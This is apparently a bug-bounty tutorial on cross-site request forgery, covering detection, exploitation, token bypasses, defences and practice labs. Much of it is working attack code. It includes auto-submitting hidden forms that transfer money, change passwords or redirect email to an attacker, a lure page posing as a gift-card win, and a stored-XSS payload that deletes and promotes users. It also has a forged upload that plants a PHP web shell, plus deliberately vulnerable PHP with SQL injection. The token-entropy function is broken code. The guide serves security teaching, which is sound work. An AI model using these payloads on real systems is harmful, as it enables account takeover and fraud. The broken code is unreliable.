# 🔄 Cross-Site Request Forgery (CSRF) - Complete Guide

> **The attack that makes users perform unintended actions - Master CSRF detection and exploitation**

## 📚 Table of Contents
- [Introduction](#introduction)
- [Types of CSRF](#types-of-csrf)
- [Detection Techniques](#detection-techniques)
- [Exploitation Methods](#exploitation-methods)
- [Advanced Techniques](#advanced-techniques)
- [Prevention & Mitigation](#prevention--mitigation)
- [Practice Labs](#practice-labs)
- [Real-World Examples](#real-world-examples)

## 🎯 Introduction

Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated. CSRF attacks specifically target state-changing requests, not theft of data, since the attacker has no way to see the response to the forged request.

### 🔍 What Makes CSRF Dangerous?
- **Unauthorized actions** - Perform actions on behalf of authenticated users
- **State changes** - Modify data, settings, or configurations
- **Financial impact** - Transfer money, make purchases, change payment methods
- **Account takeover** - Change passwords, email addresses, or security settings
- **Social engineering** - Trick users into performing malicious actions

### 📊 CSRF Statistics
- **Found in 15%** of web applications during testing
- **Average bounty**: $300 - $1,500
- **Severity range**: Medium to High (depending on impact)
- **Time to exploit**: Minutes once identified
- **Often overlooked** - Many developers forget CSRF protection

## 🔬 Types of CSRF

### 1. 🎯 GET-based CSRF

The simplest form where malicious requests are made via GET parameters.

#### Example Vulnerable Code
```php
<?php
// Vulnerable: No CSRF protection on GET request
if ($_GET['action'] == 'delete' && $_GET['id']) {
    $user_id = $_GET['id'];
    $query = "DELETE FROM users WHERE id = $user_id";
    mysqli_query($connection, $query);
    echo "User deleted successfully";
}
?>
```

#### Exploitation Example
```html
<!-- Malicious website or email -->
<img src="https://vulnerable-app.com/admin/delete.php?action=delete&id=123" 
     style="display:none;">

<!-- Or as a link -->
<a href="https://vulnerable-app.com/transfer.php?amount=1000&to=attacker">
    Click here for free gift!
</a>
```

### 2. 📝 POST-based CSRF

More common in modern applications, requires form submission or AJAX requests.

#### Example Vulnerable Code
```php
<?php
// Vulnerable: No CSRF token validation
if ($_POST['action'] == 'transfer') {
    $amount = $_POST['amount'];
    $recipient = $_POST['recipient'];
    
    // Process money transfer
    transfer_money($current_user_id, $recipient, $amount);
    echo "Transfer completed";
}
?>
```

#### Exploitation Example
```html
<!-- Malicious form that auto-submits -->
<form id="csrf-form" action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="amount" value="10000">
    <input type="hidden" name="recipient" value="attacker@evil.com">
    <input type="hidden" name="action" value="transfer">
</form>

<script>
// Auto-submit the form when page loads
document.getElementById('csrf-form').submit();
</script>
```

### 3. ⚡ AJAX-based CSRF

Modern applications using AJAX can also be vulnerable to CSRF attacks.

#### Example Vulnerable AJAX Endpoint
```javascript
// Vulnerable: No CSRF protection on AJAX endpoint
$.ajax({
    url: '/api/change-password',
    method: 'POST',
    data: {
        new_password: 'user_input',
        confirm_password: 'user_input'
    },
    success: function(response) {
        alert('Password changed successfully');
    }
});
```

#### AJAX CSRF Exploitation
```html
<script>
// CSRF attack via AJAX (if CORS allows)
fetch('https://vulnerable-app.com/api/change-password', {
    method: 'POST',
    credentials: 'include', // Include cookies
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        new_password: 'hacked123',
        confirm_password: 'hacked123'
    })
});
</script>
```

## 🔍 Detection Techniques

### 1. 🎯 Manual Detection

#### CSRF Detection Checklist
```bash
# Check for CSRF tokens in forms
1. Inspect form HTML for hidden CSRF tokens
2. Look for token validation in requests
3. Test requests without tokens
4. Try using tokens from different sessions
5. Check if tokens are properly randomized

# Common CSRF token names to look for:
- csrf_token
- _token
- authenticity_token
- csrfmiddlewaretoken
- __RequestVerificationToken
```

#### Basic CSRF Testing Process
```python
#!/usr/bin/env python3
"""
Basic CSRF Detection Tool

Author: LakshmiKanthanK(letchupkt)
Portfolio: https://letchupkt.vgrow.tech
"""

import requests
from bs4 import BeautifulSoup
import re

class CSRFDetector:
    def __init__(self, target_url, session_cookies):
        self.target_url = target_url
        self.session = requests.Session()
        
        # Set session cookies
        for cookie_name, cookie_value in session_cookies.items():
            self.session.cookies.set(cookie_name, cookie_value)
        
        self.vulnerabilities = []
    
    def find_forms(self):
        """Find all forms on the target page"""
        try:
            response = self.session.get(self.target_url)
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')
            
            return forms
        except Exception as e:
            print(f"Error finding forms: {e}")
            return []
    
    def analyze_form_csrf_protection(self, form):
        """Analyze a form for CSRF protection"""
        csrf_tokens = []
        csrf_token_names = [
            'csrf_token', '_token', 'authenticity_token',
            'csrfmiddlewaretoken', '__RequestVerificationToken'
        ]
        
        # Look for CSRF tokens in hidden inputs
        hidden_inputs = form.find_all('input', {'type': 'hidden'})
        
        for input_field in hidden_inputs:
            name = input_field.get('name', '').lower()
            if any(token_name in name for token_name in csrf_token_names):
                csrf_tokens.append({
                    'name': input_field.get('name'),
                    'value': input_field.get('value')
                })
        
        return csrf_tokens
    
    def test_csrf_vulnerability(self, form):
        """Test if form is vulnerable to CSRF"""
        action = form.get('action', '')
        method = form.get('method', 'GET').upper()
        
        if not action:
            return
        
        # Build full URL
        if action.startswith('http'):
            form_url = action
        else:
            form_url = requests.compat.urljoin(self.target_url, action)
        
        # Extract form data
        form_data = {}
        inputs = form.find_all(['input', 'textarea', 'select'])
        
        for input_field in inputs:
            name = input_field.get('name')
            if name:
                if input_field.name == 'input':
                    input_type = input_field.get('type', 'text')
                    if input_type == 'hidden':
                        form_data[name] = input_field.get('value', '')
                    elif input_type in ['text', 'email', 'password']:
                        form_data[name] = 'test_value'
                    elif input_type == 'checkbox':
                        form_data[name] = 'on'
                elif input_field.name == 'textarea':
                    form_data[name] = 'test_content'
        
        # Check for CSRF tokens
        csrf_tokens = self.analyze_form_csrf_protection(form)
        
        if not csrf_tokens:
            # No CSRF protection found
            self.vulnerabilities.append({
                'type': 'CSRF - No Protection',
                'url': form_url,
                'method': method,
                'form_data': form_data,
                'severity': 'Medium to High'
            })
        else:
            # Test if CSRF protection can be bypassed
            self.test_csrf_bypass(form_url, method, form_data, csrf_tokens)
    
    def test_csrf_bypass(self, url, method, form_data, csrf_tokens):
        """Test various CSRF bypass techniques"""
        
        # Test 1: Remove CSRF token
        test_data = form_data.copy()
        for token in csrf_tokens:
            if token['name'] in test_data:
                del test_data[token['name']]
        
        try:
            if method == 'POST':
                response = self.session.post(url, data=test_data)
            else:
                response = self.session.get(url, params=test_data)
            
            if response.status_code == 200 and 'error' not in response.text.lower():
                self.vulnerabilities.append({
                    'type': 'CSRF - Token Bypass (Removal)',
                    'url': url,
                    'method': method,
                    'bypass_method': 'Token removal',
                    'severity': 'High'
                })
        except Exception as e:
            pass
        
        # Test 2: Empty CSRF token
        test_data = form_data.copy()
        for token in csrf_tokens:
            test_data[token['name']] = ''
        
        try:
            if method == 'POST':
                response = self.session.post(url, data=test_data)
            else:
                response = self.session.get(url, params=test_data)
            
            if response.status_code == 200 and 'error' not in response.text.lower():
                self.vulnerabilities.append({
                    'type': 'CSRF - Token Bypass (Empty)',
                    'url': url,
                    'method': method,
                    'bypass_method': 'Empty token',
                    'severity': 'High'
                })
        except Exception as e:
            pass
    
    def scan(self):
        """Run comprehensive CSRF scan"""
        print(f"[+] Starting CSRF scan for {self.target_url}")
        
        forms = self.find_forms()
        print(f"[+] Found {len(forms)} forms to analyze")
        
        for i, form in enumerate(forms):
            print(f"[+] Analyzing form {i+1}")
            self.test_csrf_vulnerability(form)
        
        return self.vulnerabilities

# Usage example
session_cookies = {
    'session_id': 'abc123',
    'auth_token': 'xyz789'
}

detector = CSRFDetector("https://vulnerable-app.com/profile", session_cookies)
vulnerabilities = detector.scan()

for vuln in vulnerabilities:
    print(f"Found: {vuln['type']} at {vuln['url']}")
```##
 ⚔️ Exploitation Methods

### 1. 💰 Financial Transaction CSRF

#### Banking Transfer Attack
```html
<!-- Malicious page that performs money transfer -->
<!DOCTYPE html>
<html>
<head>
    <title>Free Gift Card!</title>
</head>
<body>
    <h1>Congratulations! You've won a $100 gift card!</h1>
    <p>Processing your reward...</p>
    
    <!-- Hidden CSRF form -->
    <form id="transfer-form" action="https://bank.com/transfer" method="POST" style="display:none;">
        <input type="hidden" name="amount" value="5000">
        <input type="hidden" name="to_account" value="123456789">
        <input type="hidden" name="description" value="Gift">
    </form>
    
    <script>
        // Auto-submit after 2 seconds
        setTimeout(function() {
            document.getElementById('transfer-form').submit();
        }, 2000);
    </script>
</body>
</html>
```

### 2. 🔐 Account Takeover CSRF

#### Password Change Attack
```html
<!-- CSRF attack to change user password -->
<form id="password-change" action="https://target.com/change-password" method="POST">
    <input type="hidden" name="new_password" value="hacked123">
    <input type="hidden" name="confirm_password" value="hacked123">
</form>

<script>
document.getElementById('password-change').submit();
</script>
```

#### Email Change Attack
```html
<!-- CSRF to change user email -->
<form id="email-change" action="https://target.com/update-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
</form>

<script>
document.getElementById('email-change').submit();
</script>
```

### 3. 👥 Social Engineering CSRF

#### Friend Request Spam
```html
<!-- CSRF to send friend requests to all users -->
<script>
var userIds = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]; // Target user IDs

userIds.forEach(function(userId) {
    var form = document.createElement('form');
    form.method = 'POST';
    form.action = 'https://social-app.com/add-friend';
    form.style.display = 'none';
    
    var input = document.createElement('input');
    input.type = 'hidden';
    input.name = 'user_id';
    input.value = userId;
    
    form.appendChild(input);
    document.body.appendChild(form);
    form.submit();
});
</script>
```

## 🚀 Advanced CSRF Techniques

### 1. 🛡️ CSRF Token Bypass Methods

#### Method 1: Token Prediction
```python
#!/usr/bin/env python3
"""
CSRF Token Analysis Tool

Author: LakshmiKanthanK(letchupkt)
Portfolio: https://letchupkt.vgrow.tech
"""

import requests
import re
import hashlib
import time
from collections import Counter

class CSRFTokenAnalyzer:
    def __init__(self, target_url, session_cookies):
        self.target_url = target_url
        self.session = requests.Session()
        
        for cookie_name, cookie_value in session_cookies.items():
            self.session.cookies.set(cookie_name, cookie_value)
        
        self.tokens = []
    
    def collect_tokens(self, num_tokens=50):
        """Collect multiple CSRF tokens for analysis"""
        print(f"[+] Collecting {num_tokens} CSRF tokens...")
        
        for i in range(num_tokens):
            try:
                response = self.session.get(self.target_url)
                
                # Extract CSRF token using regex
                token_patterns = [
                    r'name="csrf_token" value="([^"]+)"',
                    r'name="_token" value="([^"]+)"',
                    r'name="authenticity_token" value="([^"]+)"'
                ]
                
                for pattern in token_patterns:
                    match = re.search(pattern, response.text)
                    if match:
                        token = match.group(1)
                        self.tokens.append({
                            'token': token,
                            'timestamp': time.time(),
                            'length': len(token)
                        })
                        print(f"[+] Token {i+1}: {token[:20]}...")
                        break
                
                time.sleep(1)  # Avoid rate limiting
                
            except Exception as e:
                print(f"[-] Error collecting token {i+1}: {e}")
    
    def analyze_token_patterns(self):
        """Analyze collected tokens for patterns"""
        if not self.tokens:
            print("[-] No tokens collected")
            return
        
        analysis = {
            'total_tokens': len(self.tokens),
            'unique_tokens': len(set(t['token'] for t in self.tokens)),
            'token_lengths': Counter(t['length'] for t in self.tokens),
            'patterns': []
        }
        
        # Check for duplicate tokens
        token_counts = Counter(t['token'] for t in self.tokens)
        duplicates = {token: count for token, count in token_counts.items() if count > 1}
        
        if duplicates:
            analysis['patterns'].append({
                'type': 'Duplicate Tokens',
                'severity': 'Critical',
                'description': f'Found {len(duplicates)} duplicate tokens',
                'duplicates': duplicates
            })
        
        # Check for predictable patterns
        tokens_list = [t['token'] for t in self.tokens]
        
        # Check if tokens are sequential
        if self.check_sequential_pattern(tokens_list):
            analysis['patterns'].append({
                'type': 'Sequential Pattern',
                'severity': 'High',
                'description': 'Tokens appear to follow sequential pattern'
            })
        
        # Check if tokens are timestamp-based
        if self.check_timestamp_pattern():
            analysis['patterns'].append({
                'type': 'Timestamp-based',
                'severity': 'High',
                'description': 'Tokens appear to be based on timestamps'
            })
        
        # Check for weak randomness
        entropy = self.calculate_entropy(tokens_list)
        if entropy < 3.0:  # Low entropy threshold
            analysis['patterns'].append({
                'type': 'Low Entropy',
                'severity': 'Medium',
                'description': f'Token entropy is low: {entropy:.2f}'
            })
        
        return analysis
    
    def check_sequential_pattern(self, tokens):
        """Check if tokens follow sequential pattern"""
        # Convert tokens to integers if possible
        try:
            numeric_tokens = []
            for token in tokens[:10]:  # Check first 10 tokens
                # Try to extract numeric part
                numeric_part = re.search(r'\d+', token)
                if numeric_part:
                    numeric_tokens.append(int(numeric_part.group()))
            
            if len(numeric_tokens) >= 3:
                # Check if differences are consistent
                differences = [numeric_tokens[i+1] - numeric_tokens[i] 
                             for i in range(len(numeric_tokens)-1)]
                
                # If most differences are the same, it's likely sequential
                most_common_diff = Counter(differences).most_common(1)[0]
                if most_common_diff[1] >= len(differences) * 0.7:
                    return True
        
        except Exception:
            pass
        
        return False
    
    def check_timestamp_pattern(self):
        """Check if tokens are based on timestamps"""
        for token_data in self.tokens[:5]:
            token = token_data['token']
            timestamp = token_data['timestamp']
            
            # Check if token contains timestamp
            timestamp_str = str(int(timestamp))
            if timestamp_str in token or str(int(timestamp))[:8] in token:
                return True
            
            # Check if token is hash of timestamp
            timestamp_hash = hashlib.md5(timestamp_str.encode()).hexdigest()
            if timestamp_hash[:16] in token or timestamp_hash in token:
                return True
        
        return False
    
    def calculate_entropy(self, tokens):
        """Calculate entropy of token set"""
        if not tokens:
            return 0
        
        # Combine all tokens into one string
        combined = ''.join(tokens)
        
        # Calculate character frequency
        char_counts = Counter(combined)
        total_chars = len(combined)
        
        # Calculate entropy
        entropy = 0
        for count in char_counts.values():
            probability = count / total_chars
            entropy -= probability * (probability.bit_length() - 1)
        
        return entropy

# Usage
session_cookies = {'session': 'abc123'}
analyzer = CSRFTokenAnalyzer("https://target.com/form", session_cookies)
analyzer.collect_tokens(20)
analysis = analyzer.analyze_token_patterns()
print("Analysis Results:", analysis)
```

#### Method 2: Cross-Subdomain Token Reuse
```html
<!-- Test if CSRF tokens work across subdomains -->
<script>
// Get CSRF token from api.target.com
fetch('https://api.target.com/get-token')
    .then(response => response.json())
    .then(data => {
        var token = data.csrf_token;
        
        // Try to use token on www.target.com
        var form = document.createElement('form');
        form.method = 'POST';
        form.action = 'https://www.target.com/sensitive-action';
        
        var tokenInput = document.createElement('input');
        tokenInput.type = 'hidden';
        tokenInput.name = 'csrf_token';
        tokenInput.value = token;
        
        form.appendChild(tokenInput);
        document.body.appendChild(form);
        form.submit();
    });
</script>
```

### 2. 🔄 CSRF with XSS Chain

#### Stored XSS to CSRF Attack
```javascript
// Stored XSS payload that performs CSRF
<script>
// Wait for page to load
window.onload = function() {
    // Extract CSRF token from current page
    var csrfToken = document.querySelector('input[name="csrf_token"]').value;
    
    // Perform CSRF attack with valid token
    var xhr = new XMLHttpRequest();
    xhr.open('POST', '/admin/delete-user', true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.send('user_id=123&csrf_token=' + csrfToken);
    
    // Perform multiple actions
    setTimeout(function() {
        var xhr2 = new XMLHttpRequest();
        xhr2.open('POST', '/admin/promote-user', true);
        xhr2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr2.send('user_id=456&role=admin&csrf_token=' + csrfToken);
    }, 1000);
};
</script>
```

### 3. 🎭 CSRF via File Upload

#### Malicious File Upload CSRF
```html
<!-- CSRF attack via file upload -->
<form id="upload-form" action="https://target.com/upload" method="POST" enctype="multipart/form-data">
    <input type="hidden" name="file_type" value="avatar">
    <input type="file" name="file" id="file-input" style="display:none;">
</form>

<script>
// Create malicious file
var maliciousContent = '<?php system($_GET["cmd"]); ?>';
var blob = new Blob([maliciousContent], {type: 'text/plain'});
var file = new File([blob], 'shell.php', {type: 'text/plain'});

// Set file to input
var fileInput = document.getElementById('file-input');
var dataTransfer = new DataTransfer();
dataTransfer.items.add(file);
fileInput.files = dataTransfer.files;

// Submit form
document.getElementById('upload-form').submit();
</script>
```

## 🛡️ Prevention & Mitigation

### 1. 🔒 CSRF Token Implementation

#### Secure CSRF Token Generation
```python
#!/usr/bin/env python3
"""
Secure CSRF Token Implementation

Author: LakshmiKanthanK(letchupkt)
Portfolio: https://letchupkt.vgrow.tech
"""

import secrets
import hashlib
import hmac
import time
from flask import session

class CSRFProtection:
    def __init__(self, secret_key):
        self.secret_key = secret_key
    
    def generate_token(self, user_id=None):
        """Generate cryptographically secure CSRF token"""
        # Generate random bytes
        random_bytes = secrets.token_bytes(32)
        
        # Add timestamp for token expiration
        timestamp = str(int(time.time()))
        
        # Include user ID if provided
        user_data = str(user_id) if user_id else ''
        
        # Create token data
        token_data = f"{random_bytes.hex()}:{timestamp}:{user_data}"
        
        # Create HMAC signature
        signature = hmac.new(
            self.secret_key.encode(),
            token_data.encode(),
            hashlib.sha256
        ).hexdigest()
        
        # Combine token data and signature
        token = f"{token_data}:{signature}"
        
        return token
    
    def validate_token(self, token, user_id=None, max_age=3600):
        """Validate CSRF token"""
        try:
            # Split token components
            parts = token.split(':')
            if len(parts) != 4:
                return False
            
            random_hex, timestamp, token_user_id, signature = parts
            
            # Reconstruct token data
            token_data = f"{random_hex}:{timestamp}:{token_user_id}"
            
            # Verify signature
            expected_signature = hmac.new(
                self.secret_key.encode(),
                token_data.encode(),
                hashlib.sha256
            ).hexdigest()
            
            if not hmac.compare_digest(signature, expected_signature):
                return False
            
            # Check timestamp (token expiration)
            token_time = int(timestamp)
            current_time = int(time.time())
            
            if current_time - token_time > max_age:
                return False
            
            # Check user ID if provided
            if user_id is not None and str(user_id) != token_user_id:
                return False
            
            return True
            
        except Exception as e:
            return False
    
    def get_token_for_form(self, user_id=None):
        """Get CSRF token for form inclusion"""
        token = self.generate_token(user_id)
        return f'<input type="hidden" name="csrf_token" value="{token}">'

# Usage in Flask application
from flask import Flask, request, render_template_string

app = Flask(__name__)
csrf = CSRFProtection('your-secret-key-here')

@app.route('/form')
def show_form():
    user_id = session.get('user_id')
    csrf_token = csrf.generate_token(user_id)
    
    form_html = f'''
    <form method="POST" action="/submit">
        <input type="hidden" name="csrf_token" value="{csrf_token}">
        <input type="text" name="data" placeholder="Enter data">
        <button type="submit">Submit</button>
    </form>
    '''
    
    return form_html

@app.route('/submit', methods=['POST'])
def submit_form():
    user_id = session.get('user_id')
    token = request.form.get('csrf_token')
    
    if not csrf.validate_token(token, user_id):
        return "CSRF token validation failed", 403
    
    # Process form data
    data = request.form.get('data')
    return f"Data processed: {data}"
```

### 2. 🍪 SameSite Cookie Attribute

#### SameSite Cookie Implementation
```python
# Flask example with SameSite cookies
from flask import Flask, make_response

app = Flask(__name__)

@app.route('/login', methods=['POST'])
def login():
    # Authenticate user
    if authenticate_user(request.form['username'], request.form['password']):
        response = make_response("Login successful")
        
        # Set session cookie with SameSite attribute
        response.set_cookie(
            'session_id',
            generate_session_id(),
            secure=True,        # Only send over HTTPS
            httponly=True,      # Not accessible via JavaScript
            samesite='Strict'   # Strict SameSite policy
        )
        
        return response
    
    return "Login failed", 401

# Different SameSite options:
# 'Strict' - Cookie never sent in cross-site requests
# 'Lax' - Cookie sent in top-level navigation (default)
# 'None' - Cookie sent in all cross-site requests (requires Secure)
```

### 3. 🔐 Double Submit Cookie Pattern

#### Double Submit Cookie Implementation
```javascript
// Client-side: Set CSRF token in cookie and form
function setCSRFToken() {
    var token = generateRandomToken();
    
    // Set cookie
    document.cookie = `csrf_token=${token}; Secure; SameSite=Strict`;
    
    // Set form field
    document.querySelector('input[name="csrf_token"]').value = token;
}

// Server-side validation (Node.js example)
function validateCSRF(req, res, next) {
    var cookieToken = req.cookies.csrf_token;
    var formToken = req.body.csrf_token || req.headers['x-csrf-token'];
    
    if (!cookieToken || !formToken || cookieToken !== formToken) {
        return res.status(403).json({error: 'CSRF token validation failed'});
    }
    
    next();
}
```

## 🧪 Practice Labs

### 1. 🎓 Beginner Labs

#### PortSwigger Web Security Academy - CSRF Labs
```
1. CSRF vulnerability with no defenses
2. CSRF where token validation depends on request method
3. CSRF where token validation depends on token being present
4. CSRF where token is not tied to user session
5. CSRF where token is tied to non-session cookie
6. CSRF where token is duplicated in cookie
7. CSRF where Referer validation depends on header being present
8. CSRF with broken Referer validation
```

#### Custom CSRF Lab Setup
```php
<?php
// vulnerable-csrf-lab.php
session_start();

// Simple login system
if (!isset($_SESSION['user_id'])) {
    if (isset($_POST['username']) && isset($_POST['password'])) {
        // Hardcoded credentials for demo
        if ($_POST['username'] === 'admin' && $_POST['password'] === 'password') {
            $_SESSION['user_id'] = 1;
            $_SESSION['username'] = 'admin';
            $_SESSION['balance'] = 1000;
        }
    }
    
    if (!isset($_SESSION['user_id'])) {
        echo '<form method="POST">
                Username: <input name="username" type="text" value="admin">
                Password: <input name="password" type="password" value="password">
                <input type="submit" value="Login">
              </form>';
        exit;
    }
}

// Vulnerable money transfer (no CSRF protection)
if (isset($_POST['transfer'])) {
    $amount = (int)$_POST['amount'];
    $recipient = $_POST['recipient'];
    
    if ($amount > 0 && $amount <= $_SESSION['balance']) {
        $_SESSION['balance'] -= $amount;
        echo "<div style='color: red;'>Transferred $$amount to $recipient</div>";
        echo "<div>Remaining balance: $" . $_SESSION['balance'] . "</div>";
    } else {
        echo "<div style='color: red;'>Invalid transfer amount</div>";
    }
}

// Display transfer form
echo "<h2>Welcome, " . $_SESSION['username'] . "</h2>";
echo "<p>Current balance: $" . $_SESSION['balance'] . "</p>";
echo '<form method="POST">
        <h3>Transfer Money</h3>
        Amount: <input name="amount" type="number" min="1" max="' . $_SESSION['balance'] . '">
        Recipient: <input name="recipient" type="text" placeholder="recipient@email.com">
        <input type="hidden" name="transfer" value="1">
        <input type="submit" value="Transfer">
      </form>';
?>
```

### 2. 🔬 Intermediate Labs

#### CSRF Attack Page Template
```html
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Attack Demo</title>
</head>
<body>
    <h1>You've won a prize! Claiming your reward...</h1>
    
    <!-- CSRF attack form -->
    <form id="csrf-attack" action="http://localhost/vulnerable-csrf-lab.php" method="POST">
        <input type="hidden" name="amount" value="500">
        <input type="hidden" name="recipient" value="attacker@evil.com">
        <input type="hidden" name="transfer" value="1">
    </form>
    
    <script>
        // Auto-submit after 2 seconds
        setTimeout(function() {
            document.getElementById('csrf-attack').submit();
        }, 2000);
    </script>
    
    <p>Please wait while we process your reward...</p>
</body>
</html>
```

## 🌍 Real-World Examples

### 1. 💰 High-Value Bug Bounty Reports

#### Facebook CSRF ($5,000)
- **Vulnerability**: CSRF in Facebook Pages management
- **Vector**: Missing CSRF protection on page settings
- **Impact**: Unauthorized changes to business pages
- **Technique**: POST-based CSRF with social engineering
- **Key Learning**: Even major platforms can miss CSRF protection

#### Twitter CSRF ($1,400)
- **Vulnerability**: CSRF in Twitter Ads dashboard
- **Vector**: Missing token validation on campaign creation
- **Impact**: Unauthorized ad campaign creation and billing
- **Technique**: AJAX-based CSRF attack
- **Key Learning**: API endpoints often lack CSRF protection

### 2. 📊 Common CSRF Attack Scenarios

#### E-commerce Price Manipulation
```html
<!-- CSRF to change product prices -->
<form action="https://shop.com/admin/update-price" method="POST">
    <input type="hidden" name="product_id" value="123">
    <input type="hidden" name="price" value="1.00">
</form>
```

#### Social Media Account Takeover
```html
<!-- CSRF to change account email -->
<form action="https://social.com/settings/email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
</form>
```

## 🎯 Key Takeaways

### ✅ Essential Skills to Master
- [ ] **Detection**: Identify missing CSRF protection in forms and APIs
- [ ] **Exploitation**: Create effective CSRF attack payloads
- [ ] **Bypass**: Circumvent weak CSRF protection mechanisms
- [ ] **Social Engineering**: Craft convincing attack scenarios
- [ ] **Impact Assessment**: Understand business impact of CSRF attacks

### 🚀 Advanced Techniques to Learn
- [ ] **Token analysis** - Identify weak or predictable CSRF tokens
- [ ] **Cross-domain attacks** - Exploit CORS misconfigurations with CSRF
- [ ] **Mobile CSRF** - CSRF attacks against mobile applications
- [ ] **API CSRF** - CSRF attacks against REST and GraphQL APIs
- [ ] **Chaining attacks** - Combine CSRF with XSS or other vulnerabilities

### 💡 Pro Tips for Bug Bounty Hunters
1. **Test all state-changing actions** - Focus on forms that modify data
2. **Check API endpoints** - Many APIs lack CSRF protection
3. **Look for weak tokens** - Analyze token generation patterns
4. **Test different HTTP methods** - Try GET, POST, PUT, DELETE
5. **Social engineering context** - Create believable attack scenarios
6. **Mobile applications** - Test mobile app web views for CSRF
7. **Administrative functions** - High-impact targets for CSRF
8. **Chain with other bugs** - Combine CSRF with XSS or open redirects

---

## 📝 Author & Credits

**Created by: LakshmiKanthanK(letchupkt)**

🔗 **Connect with me:**
- 🌐 **Portfolio**: [letchupkt.vgrow.tech](https://letchupkt.vgrow.tech)
- 📸 **Instagram**: [@letchu_pkt](https://instagram.com/letchu_pkt)
- 💼 **LinkedIn**: [lakshmikanthank](https://linkedin.com/in/lakshmikanthank)
- ✍️ **Medium**: [letchupkt.medium.com](https://letchupkt.medium.com)

---

**⚖️ Legal Reminder**: Only test CSRF on systems you own or have explicit permission to test. Always follow responsible disclosure practices and respect bug bounty program rules.

**🎯 Next Steps**: Practice on the provided labs, study real-world examples, and focus on understanding state-changing operations. CSRF mastery comes with understanding application workflows and user interactions.

*© 2025 LetchuPKT. Part of the Complete Bug Bounty Hunting Roadmap 2025.*